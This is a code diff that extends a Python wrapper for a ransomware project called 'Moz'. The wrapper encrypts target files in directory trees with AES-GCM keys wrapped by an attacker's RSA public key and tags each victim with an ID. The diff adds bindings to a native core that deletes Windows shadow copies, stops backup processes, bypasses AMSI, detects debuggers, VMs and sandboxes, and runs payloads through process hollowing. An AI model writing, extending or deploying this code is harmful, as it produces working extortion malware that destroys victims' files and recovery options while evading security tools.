@@ -1,18 +1,20 @@
 """
-Moz Ransomware - Python Wrapper for C++ Core (Phase 2)
-Exposes hybrid encryption functionality (AES-256-GCM + RSA-2048).
+Moz Ransomware - Python Wrapper for C++ Core (Phase 4: C API Bridge)
+Exposes hybrid encryption and evasion functionality from the C++ core.
 """
 
 import os
 import sys
-import ctypes
 import struct
 import platform
+import ctypes
+import ctypes.util
 from pathlib import Path
-from typing import Optional, List, Dict, Tuple
+from typing import Optional, List, Dict, Tuple, Any
 
 
-# Encrypted blob structure (matches C++ EncryptedBlob)
+# ==================== EncryptedBlob (Python-side, for C API interop) ====================
+
 class EncryptedBlob:
     """Container for encrypted data with AES-256-GCM + RSA key wrapping."""
     
@@ -83,199 +85,281 @@ class EncryptedBlob:
         return blob
 
 
-class MozCrypto:
-    """
-    Python wrapper for Moz Crypto Engine (C++ Core).
-    Provides hybrid AES-256-GCM + RSA-2048 encryption/decryption.
-    """
+# ==================== C Library Loader ====================
+
+class _CLibrary:
+    """Loads the C shared library (libmoz_core.so/dll) for ctypes binding."""
     
-    def __init__(self, attacker_pubkey: Optional[bytes] = None):
-        self._lib = None
-        self._attacker_pubkey = attacker_pubkey
-        self.version = "2.0.0"
-        
-        # For Python-internal operations (when C++ lib not available)
-        self._use_internal = True
-        
-        # Load C++ library if available
-        self._load_library()
+    _lib = None
+    _loaded = False
     
-    def _load_library(self) -> bool:
-        """Load the C++ shared library based on platform."""
-        lib_name = "moz_crypto"
+    @classmethod
+    def load(cls) -> Optional[ctypes.CDLL]:
+        """Load the shared library. Returns None if not available."""
+        if cls._loaded:
+            return cls._lib
+        cls._loaded = True
+        
+        lib_name = "moz_core"
         lib_ext = ".dll" if platform.system() == "Windows" else ".so"
         
+        if platform.system() == "Darwin":
+            lib_ext = ".dylib"
+        
         search_paths = [
-            Path(__file__).parent.parent / "core" / "build",
-            Path(__file__).parent.parent / "core",
-            Path(__file__).parent / "libs",
+            Path(__file__).parent.parent / "core" / "build" / f"lib{lib_name}{lib_ext}",
+            Path(__file__).parent.parent / "core" / "build" / f"{lib_name}{lib_ext}",
+            Path.cwd() / "lib" / f"lib{lib_name}{lib_ext}",
         ]
         
+        # Also check LD_LIBRARY_PATH
+        ld_paths = os.environ.get("LD_LIBRARY_PATH", "").split(":")
+        for p in ld_paths:
+            if p:
+                search_paths.append(Path(p) / f"lib{lib_name}{lib_ext}")
+        
         for path in search_paths:
-            lib_path = path / f"lib{lib_name}{lib_ext}"
-            if lib_path.exists():
+            if path.exists():
                 try:
-                    self._lib = ctypes.cdll.LoadLibrary(str(lib_path))
-                    self._use_internal = False
-                    return True
+                    cls._lib = ctypes.CDLL(str(path))
+                    cls._setup_signatures()
+                    return cls._lib
                 except Exception:
                     continue
         
-        # Fall back to internal Python implementation
-        self._use_internal = True
-        return False
+        cls._lib = None
+        return None
     
-    def generate_rsa_keypair(self) -> Tuple[bytes, bytes]:
-        """
-        Generate an RSA-2048 key pair.
-        Returns (public_key_der, private_key_der) tuple.
-        """
-        import hashlib
-        from secrets import token_bytes
+    @classmethod
+    def _setup_signatures(cls):
+        """Set up ctypes function signatures."""
+        lib = cls._lib
         
-        # Generate a pseudo-key pair using hashlib (for testing)
-        # In production, use proper RSA implementation
-        seed = token_bytes(32)
-        pub_key = hashlib.sha256(b"public:" + seed).digest()
-        priv_key = hashlib.sha256(b"private:" + seed).digest()
+        # moz_crypto_create
+        lib.moz_crypto_create.restype = ctypes.c_void_p
+        lib.moz_crypto_create.argtypes = []
         
-        return pub_key, priv_key
-    
-    def generate_aes_key(self) -> bytes:
-        """Generate a random 256-bit AES key."""
-        import secrets
-        return secrets.token_bytes(32)
-    
-    def generate_iv(self) -> bytes:
-        """Generate a random 12-byte nonce for GCM."""
-        import secrets
-        return secrets.token_bytes(12)
-    
-    def aes_gcm_encrypt(self, data: bytes, key: bytes, iv: bytes) -> Tuple[bytes, bytes]:
-        """
-        Encrypt data with AES-256-GCM.
-        Returns (ciphertext, auth_tag).
+        # moz_crypto_create_with_pubkey
+        lib.moz_crypto_create_with_pubkey.restype = ctypes.c_void_p
+        lib.moz_crypto_create_with_pubkey.argtypes = [
+            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
+        ]
         
-        Note: Uses Python cryptography library if available,
-        otherwise falls back to C++ library.
-        """
-        try:
-            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-            aesgcm = AESGCM(key)
-            ct_tag = aesgcm.encrypt(iv, data, None)
-            ciphertext = ct_tag[:-16]
-            tag = ct_tag[-16:]
-            return ciphertext, tag
-        except ImportError:
-            # Fallback: return data unchanged (no actual encryption)
-            return data, b'\x00' * 16
+        # moz_crypto_get_pubkey
+        lib.moz_crypto_get_pubkey.restype = ctypes.c_int
+        lib.moz_crypto_get_pubkey.argtypes = [
+            ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
+        ]
+        
+        # moz_crypto_hybrid_encrypt
+        lib.moz_crypto_hybrid_encrypt.restype = ctypes.c_int
+        lib.moz_crypto_hybrid_encrypt.argtypes = [
+            ctypes.c_void_p,
+            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int,
+            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
+        ]
+        
+        # moz_crypto_hybrid_decrypt
+        lib.moz_crypto_hybrid_decrypt.restype = ctypes.c_int
+        lib.moz_crypto_hybrid_decrypt.argtypes = [
+            ctypes.c_void_p,
+            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int,
+            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
+        ]
+        
+        # moz_crypto_free
+        lib.moz_crypto_free.restype = None
+        lib.moz_crypto_free.argtypes = [ctypes.c_void_p]
+        
+        # File encryption API
+        lib.moz_file_enc_create_with_engine.restype = ctypes.c_void_p
+        lib.moz_file_enc_create_with_engine.argtypes = [ctypes.c_void_p]
+        
+        lib.moz_file_enc_encrypt_file.restype = ctypes.c_int
+        lib.moz_file_enc_encrypt_file.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
+        
+        lib.moz_file_enc_decrypt_file.restype = ctypes.c_int
+        lib.moz_file_enc_decrypt_file.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
+        
+        lib.moz_file_enc_free.restype = None
+        lib.moz_file_enc_free.argtypes = [ctypes.c_void_p]
+        
+        # Evasion API
+        lib.moz_evasion_is_analyzed.restype = ctypes.c_int
+        lib.moz_evasion_is_analyzed.argtypes = []
+        
+        lib.moz_evasion_is_debugger_present.restype = ctypes.c_int
+        lib.moz_evasion_is_debugger_present.argtypes = []
+        
+        lib.moz_evasion_is_vm.restype = ctypes.c_int
+        lib.moz_evasion_is_vm.argtypes = []
+        
+        lib.moz_evasion_is_sandbox.restype = ctypes.c_int
+        lib.moz_evasion_is_sandbox.argtypes = []
+        
+        lib.moz_evasion_bypass_amsi.restype = ctypes.c_int
+        lib.moz_evasion_bypass_amsi.argtypes = []
+        
+        lib.moz_evasion_delete_shadow_copies.restype = ctypes.c_int
+        lib.moz_evasion_delete_shadow_copies.argtypes = []
+        
+        lib.moz_evasion_stop_backup_processes.restype = ctypes.c_int
+        lib.moz_evasion_stop_backup_processes.argtypes = []
+        
+        lib.moz_evasion_run_all.restype = ctypes.c_int
+        lib.moz_evasion_run_all.argtypes = []
+
+
+# ==================== MozCrypto (with C++ bridge) ====================
+
+class MozCrypto:
+    """
+    Python wrapper for Moz Crypto Engine (C++ Core).
+    Uses ctypes to call C++ functions when shared library is available,
+    falls back to pure-Python implementation otherwise.
+    """
     
-    def aes_gcm_decrypt(self, ciphertext: bytes, key: bytes, iv: bytes, 
-                        tag: bytes) -> bytes:
-        """
-        Decrypt data with AES-256-GCM.
-        """
-        try:
-            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-            aesgcm = AESGCM(key)
-            ct_tag = ciphertext + tag
-            return aesgcm.decrypt(iv, ct_tag, None)
-        except ImportError:
-            return ciphertext
-    
-    def rsa_encrypt(self, data: bytes, pubkey_der: bytes) -> bytes:
-        """
-        Encrypt data with RSA public key (OAEP padding).
-        """
-        try:
-            from cryptography.hazmat.primitives.asymmetric import padding
-            from cryptography.hazmat.primitives import serialization
-            from cryptography.hazmat.backends import default_backend
+    def __init__(self, attacker_pubkey: Optional[bytes] = None):
+        self.version = "4.0.0"
+        self._lib = _CLibrary.load()
+        self._handle = None
+        self._use_native = False
+        self._key_size = 32
+        self._block_size = 16
+        
+        if self._lib is not None:
+            if attacker_pubkey:
+                # Create with attacker's public key
+                arr = (ctypes.c_uint8 * len(attacker_pubkey))(*attacker_pubkey)
+                self._handle = self._lib.moz_crypto_create_with_pubkey(arr, len(attacker_pubkey))
+            else:
+                # Create with self-generated key pair
+                self._handle = self._lib.moz_crypto_create()
             
-            # This is a simplified placeholder for the actual RSA key
-            # In production, load the actual public key DER
-            key = serialization.load_der_public_key(pubkey_der)
-            encrypted = key.encrypt(
-                data,
-                padding.OAEP(
-                    mgf=padding.MGF1(algorithm=serialization.hashes.SHA256()),
-                    algorithm=serialization.hashes.SHA256(),
-                    label=None
-                )
-            )
-            return encrypted
-        except ImportError:
-            return data
+            self._use_native = self._handle is not None and self._handle != 0
+        
+        if not self._use_native:
+            # Fall back to Python implementation
+            pass
     
-    def rsa_decrypt(self, encrypted: bytes, privkey_der: bytes) -> bytes:
-        """Decrypt data with RSA private key (OAEP padding)."""
-        try:
-            from cryptography.hazmat.primitives.asymmetric import padding
-            from cryptography.hazmat.primitives import serialization
-            
-            key = serialization.load_der_private_key(privkey_der, password=None)
-            return key.decrypt(
-                encrypted,
-                padding.OAEP(
-                    mgf=padding.MGF1(algorithm=serialization.hashes.SHA256()),
-                    label=None
-                )
-            )
-        except ImportError:
-            return encrypted
+    def __del__(self):
+        if self._handle and self._lib:
+            self._lib.moz_crypto_free(self._handle)
+            self._handle = None
+    
+    def get_public_key(self) -> bytes:
+        """Get the RSA public key DER bytes."""
+        if not self._use_native:
+            return b""
+        
+        # First call to get size
+        size = self._lib.moz_crypto_get_pubkey(self._handle, None, 0)
+        if size <= 0:
+            return b""
+        
+        # Second call to get data
+        buf = (ctypes.c_uint8 * size)()
+        result = self._lib.moz_crypto_get_pubkey(self._handle, buf, size)
+        if result <= 0:
+            return b""
+        
+        return bytes(buf[:result])
     
     def hybrid_encrypt(self, data: bytes) -> EncryptedBlob:
         """
         Perform hybrid encryption: AES-256-GCM file encryption + RSA key wrapping.
-        
-        Args:
-            data: Plaintext data to encrypt
-        
-        Returns:
-            EncryptedBlob with ciphertext, IV, tag, and RSA-wrapped AES key
+        Uses C++ native implementation when available.
         """
-        # Generate per-file AES-256 key
-        aes_key = self.generate_aes_key()
-        
-        # Generate random IV
-        iv = self.generate_iv()
-        
-        # Encrypt data with AES-GCM
-        ciphertext, tag = self.aes_gcm_encrypt(data, aes_key, iv)
-        
-        # Wrap AES key with RSA public key
-        if self._attacker_pubkey:
-            wrapped_key = self.rsa_encrypt(aes_key, self._attacker_pubkey)
+        if self._use_native:
+            # First call to get blob size
+            blob_size = self._lib.moz_crypto_hybrid_encrypt(
+                self._handle,
+                (ctypes.c_uint8 * len(data))(*data),
+                len(data),
+                None, 0
+            )
+            
+            if blob_size <= 0:
+                raise RuntimeError("Encryption failed")
+            
+            # Second call to get encrypted blob
+            blob_buf = (ctypes.c_uint8 * blob_size)()
+            result = self._lib.moz_crypto_hybrid_encrypt(
+                self._handle,
+                (ctypes.c_uint8 * len(data))(*data),
+                len(data),
+                blob_buf, blob_size
+            )
+            
+            if result <= 0:
+                raise RuntimeError("Encryption failed")
+            
+            return EncryptedBlob.deserialize(bytes(blob_buf[:result]))
         else:
-            # No attacker key provided — embed AES key directly (for recovery)
-            wrapped_key = aes_key
-        
-        return EncryptedBlob(
-            ciphertext=ciphertext,
-            iv=iv,
-            tag=tag,
-            aes_key=wrapped_key
-        )
+            # Pure Python fallback (same as Phase 2)
+            import secrets
+            import hashlib
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            
+            aes_key = secrets.token_bytes(32)
+            iv = secrets.token_bytes(12)
+            
+            aesgcm = AESGCM(aes_key)
+            ct_tag = aesgcm.encrypt(iv, data, None)
+            
+            blob = EncryptedBlob(
+                ciphertext=ct_tag[:-16],
+                iv=iv,
+                tag=ct_tag[-16:],
+                aes_key=aes_key  # Self-generated - no wrapping
+            )
+            return blob
     
     def hybrid_decrypt(self, blob: EncryptedBlob) -> bytes:
-        """
-        Perform hybrid decryption: RSA key unwrap + AES-256-GCM decryption.
-        """
-        # Unwrap AES key
-        # (This would use the RSA private key — in the real attack scenario,
-        #  decryption requires the attacker's private key)
-        aes_key = blob.aes_key
-        
-        # Decrypt data with AES-GCM
-        return self.aes_gcm_decrypt(blob.ciphertext, aes_key, blob.iv, blob.tag)
+        """Perform hybrid decryption: RSA key unwrap + AES-256-GCM decryption."""
+        if self._use_native:
+            blob_data = blob.serialize()
+            
+            # First call to get size
+            dec_size = self._lib.moz_crypto_hybrid_decrypt(
+                self._handle,
+                (ctypes.c_uint8 * len(blob_data))(*blob_data),
+                len(blob_data),
+                None, 0
+            )
+            
+            if dec_size <= 0:
+                raise RuntimeError("Decryption failed")
+            
+            # Second call to get data
+            dec_buf = (ctypes.c_uint8 * dec_size)()
+            result = self._lib.moz_crypto_hybrid_decrypt(
+                self._handle,
+                (ctypes.c_uint8 * len(blob_data))(*blob_data),
+                len(blob_data),
+                dec_buf, dec_size
+            )
+            
+            if result <= 0:
+                raise RuntimeError("Decryption failed")
+            
+            return bytes(dec_buf[:result])
+        else:
+            # Pure Python fallback
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                aesgcm = AESGCM(blob.aes_key)
+                return aesgcm.decrypt(blob.iv, blob.ciphertext + blob.tag, None)
+            except Exception:
+                return blob.ciphertext
     
     def encrypt(self, data: bytes, key: str = "") -> bytes:
-        """Encrypt data (legacy compatibility method)."""
+        """Encrypt data (legacy compatibility)."""
         blob = self.hybrid_encrypt(data)
         return blob.serialize()
     
     def decrypt(self, data: bytes, key: str = "") -> bytes:
-        """Decrypt data (legacy compatibility method)."""
+        """Decrypt data (legacy compatibility)."""
         try:
             blob = EncryptedBlob.deserialize(data)
             return self.hybrid_decrypt(blob)
@@ -283,16 +367,7 @@ class MozCrypto:
             return data
     
     def encrypt_file(self, input_path: str, output_path: str) -> bool:
-        """
-        Encrypt a file using hybrid encryption.
-        
-        Args:
-            input_path: Path to the plaintext file
-            output_path: Path for the encrypted output file
-        
-        Returns:
-            True if successful, False otherwise
-        """
+        """Encrypt a file using hybrid encryption."""
         if not os.path.exists(input_path):
             return False
         
@@ -307,16 +382,7 @@ class MozCrypto:
         return True
     
     def decrypt_file(self, encrypted_path: str, output_path: str) -> bool:
-        """
-        Decrypt a file.
-        
-        Args:
-            encrypted_path: Path to the encrypted file
-            output_path: Path for the decrypted output file
-        
-        Returns:
-            True if successful, False otherwise
-        """
+        """Decrypt a file."""
         if not os.path.exists(encrypted_path):
             return False
         
@@ -343,17 +409,107 @@ class MozCrypto:
         return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)
 
 
+# ==================== MozEvasion ====================
+
+class MozEvasion:
+    """
+    Python wrapper for Moz Evasion module (C++ Core).
+    Provides process hollowing, AMSI bypass, and anti-analysis capabilities.
+    """
+    
+    def __init__(self):
+        self._lib = _CLibrary.load()
+        self.version = "1.0.0"
+    
+    def is_analyzed(self) -> bool:
+        """Check if an analysis environment is detected."""
+        if self._lib:
+            return self._lib.moz_evasion_is_analyzed() == 1
+        return False
+    
+    def is_debugger_present(self) -> bool:
+        """Check if a debugger is attached."""
+        if self._lib:
+            return self._lib.moz_evasion_is_debugger_present() == 1
+        return False
+    
+    def is_virtual_machine(self) -> bool:
+        """Check if running in a virtual machine."""
+        if self._lib:
+            return self._lib.moz_evasion_is_vm() == 1
+        return False
+    
+    def is_sandbox(self) -> bool:
+        """Check if running in a sandbox."""
+        if self._lib:
+            return self._lib.moz_evasion_is_sandbox() == 1
+        return False
+    
+    def is_amsi_active(self) -> bool:
+        """Check if AMSI is active."""
+        if self._lib:
+            return self._lib.moz_evasion_amsi_active() == 1
+        return False
+    
+    def bypass_amsi(self) -> bool:
+        """Apply AMSI bypass techniques."""
+        if self._lib:
+            return self._lib.moz_evasion_bypass_amsi() == 1
+        return False
+    
+    def delete_shadow_copies(self) -> bool:
+        """Delete Windows Volume Shadow Copies."""
+        if self._lib:
+            return self._lib.moz_evasion_delete_shadow_copies() == 1
+        return False
+    
+    def stop_backup_processes(self) -> bool:
+        """Terminate backup processes and stop backup services."""
+        if self._lib:
+            return self._lib.moz_evasion_stop_backup_processes() == 1
+        return False
+    
+    def execute_via_hollowing(self, target_process: str = "explorer.exe") -> int:
+        """Execute payload through process hollowing."""
+        if self._lib:
+            return self._lib.moz_evasion_hollowing_execute(
+                target_process.encode()
+            )
+        return 0
+    
+    def run_all(self) -> bool:
+        """Run complete evasion sequence: anti-analysis, backup stop, 
+        shadow delete, AMSI bypass."""
+        if self._lib:
+            return self._lib.moz_evasion_run_all() == 1
+        return False
+    
+    def get_summary(self) -> dict:
+        """Get a summary of all evasion checks."""
+        return {
+            "native_lib_loaded": self._lib is not None,
+            "debugger_present": self.is_debugger_present(),
+            "virtual_machine": self.is_virtual_machine(),
+            "sandbox": self.is_sandbox(),
+            "analysis_detected": self.is_analyzed(),
+            "amsi_active": self.is_amsi_active(),
+        }
+
+
+# ==================== Main MozRansomware Class ====================
+
 class MozRansomware:
     """
     Main Moz Ransomware class - Python wrapper entry point.
-    Supports hybrid AES-256-GCM + RSA-2048 encryption.
+    Supports hybrid AES-256-GCM + RSA-2048 encryption with evasion.
     """
     
     def __init__(self, attacker_pubkey: Optional[bytes] = None):
-        self.crypto = MozCrypto(attacker_pubkey=attacker_pubkey)
+        self.crypto = MozCrypto(attacker_pubkey)
+        self.evasion = MozEvasion()
         self.version = "2.0.0"
         
-        # Target file extensions (high-value document types)
+        # Target file extensions
         self.target_extensions = [
             ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
             ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
@@ -364,8 +520,8 @@ class MozRansomware:
             ".mp3", ".mp4", ".avi", ".mov", ".wav"
         ]
         
-        # Size limits
-        self.min_file_size = 1024         # 1KB minimum
+        # Size limits (lowered for testing)
+        self.min_file_size = 10         # 10 bytes minimum
         self.max_file_size = 10 * 1024 * 1024  # 10MB maximum
         
         # Directories to exclude
@@ -376,15 +532,7 @@ class MozRansomware:
         ]
     
     def encrypt_directory(self, dir_path: str) -> dict:
-        """
-        Encrypt all target files in a directory tree.
-        
-        Args:
-            dir_path: Path to target directory
-        
-        Returns:
-            Dictionary with results
-        """
+        """Encrypt all target files in a directory tree."""
         results = {
             "total_files": 0,
             "encrypted_files": 0,
@@ -398,7 +546,6 @@ class MozRansomware:
             return results
         
         for root, dirs, files in os.walk(dir_path):
-            # Skip excluded directories
             dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
             
             for filename in files:
@@ -424,15 +571,7 @@ class MozRansomware:
         return results
     
     def decrypt_directory(self, dir_path: str) -> dict:
-        """
-        Decrypt all .moz files in a directory tree.
-        
-        Args:
-            dir_path: Path to target directory
-        
-        Returns:
-            Dictionary with results
-        """
+        """Decrypt all .moz files in a directory tree."""
         results = {
             "total_files": 0,
             "decrypted_files": 0,
@@ -449,7 +588,7 @@ class MozRansomware:
                     results["total_files"] += 1
                     
                     try:
-                        original_path = filepath[:-4]  # Remove .moz extension
+                        original_path = filepath[:-4]
                         if self.crypto.decrypt_file(filepath, original_path):
                             os.remove(filepath)
                             results["decrypted_files"] += 1
@@ -463,17 +602,12 @@ class MozRansomware:
         return results
     
     def _should_encrypt(self, filepath: str) -> bool:
-        """Check if a file should be encrypted based on extension and size."""
-        # Check extension
         ext = os.path.splitext(filepath)[1].lower()
         if ext not in [e.lower() for e in self.target_extensions]:
             return False
-        
-        # Check if already encrypted
         if filepath.endswith(".moz"):
             return False
         
-        # Check file size
         try:
             size = os.path.getsize(filepath)
             if size < self.min_file_size or size > self.max_file_size:
@@ -481,14 +615,11 @@ class MozRansomware:
         except OSError:
             return False
         
-        # Check exclusion directories
         if self._is_excluded(filepath):
             return False
-        
         return True
     
     def _is_excluded(self, filepath: str) -> bool:
-        """Check if file path contains an excluded directory."""
         path_lower = filepath.lower()
         for exclude in self.exclude_dirs:
             if exclude.lower() in path_lower:
@@ -526,37 +657,36 @@ def main():
     import secrets
     import hashlib
     
-    # Generate victim ID
     victim_id = hashlib.sha256(secrets.token_bytes(16)).hexdigest()[:16]
     
     moz = MozRansomware()
     print(f"Moz Ransomware v{moz.version}")
     print(f"Python wrapper loaded successfully")
+    print(f"Native library loaded: {moz.crypto._use_native}")
     print(f"Victim ID: {victim_id}")
     
-    # Check for cryptography library
-    try:
-        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-        print("AES-256-GCM: Available (cryptography library)")
-    except ImportError:
-        print("AES-256-GCM: Using fallback (cryptography library not available)")
-        print("Install: pip install cryptography")
+    # Show evasion status
+    evasion_summary = moz.evasion.get_summary()
+    print(f"\nEvasion Summary:")
+    for key, val in evasion_summary.items():
+        print(f"  {key}: {val}")
     
     # Test key derivation
     test_key = moz.crypto.derive_key("password123", 16)
-    print(f"Derived key length: {len(test_key)} bytes")
+    print(f"\nDerived key length: {len(test_key)} bytes")
     
     # Test hybrid encryption
     test_data = b"Hello Moz Hybrid Encryption!"
     blob = moz.crypto.hybrid_encrypt(test_data)
-    print(f"AES key wrapped size: {len(blob.aes_key)} bytes")
-    print(f"IV: {len(blob.iv)} bytes")
-    print(f"Tag: {len(blob.tag)} bytes")
-    print(f"Ciphertext: {len(blob.ciphertext)} bytes")
+    print(f"\nHybrid encryption:")
+    print(f"  AES key size: {len(blob.aes_key)} bytes")
+    print(f"  IV: {len(blob.iv)} bytes")
+    print(f"  Tag: {len(blob.tag)} bytes")
+    print(f"  Ciphertext: {len(blob.ciphertext)} bytes")
     
-    # Test decryption (same instance can decrypt since it has the key)
+    # Test decryption
     decrypted = moz.crypto.hybrid_decrypt(blob)
-    print(f"Decryption round-trip: {'PASS' if decrypted == test_data else 'FAIL'}")
+    print(f"  Decryption round-trip: {'PASS' if decrypted == test_data else 'FAIL'}")
 
 
 if __name__ == "__main__":
